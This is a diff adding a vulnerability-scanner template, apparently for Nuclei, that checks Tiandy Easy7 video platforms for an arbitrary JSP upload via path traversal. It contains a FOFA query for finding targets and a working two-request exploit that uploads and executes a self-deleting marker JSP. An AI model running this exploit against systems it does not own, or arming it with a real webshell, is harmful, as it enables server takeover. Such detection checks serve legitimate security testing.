@@ -1,0 +1,45 @@
+id: TianDiWeiYe-Easy7-uploadCheckImg-File-Upload
+
+info:
+  name: 天地伟业Easy7 /Easy7/rest/file/uploadCheckImg 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业Easy7 /Easy7/rest/file/uploadCheckImg 接口存在任意文件上传漏洞，攻击者可通过构造包含恶意文件的HTTP请求，利用该接口将文件上传至服务器指定目录，并可通过后续请求直接访问上传的文件，进而获取服务器权限、执行恶意代码，严重危害系统安全。
+  reference: |
+    -
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/file/uploadCheckImg?fileName={{username}}.jsp&uploadPicturePath=/../../root/tiandy/data/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: close
+        Content-Length: 426
+        Content-Type: multipart/form-data; boundary=137cc28036af5450d530706de56fa61aab9f095cdd34b14f36054bd66492
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+        --137cc28036af5450d530706de56fa61aab9f095cdd34b14f36054bd66492
+        Content-Disposition: form-data; name="file"; filename="{{username}}.txt"
+        Content-Type: images/jpeg
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ=="))); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --137cc28036af5450d530706de56fa61aab9f095cdd34b14f36054bd66492--
+
+      - |
+        GET /imagelive/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
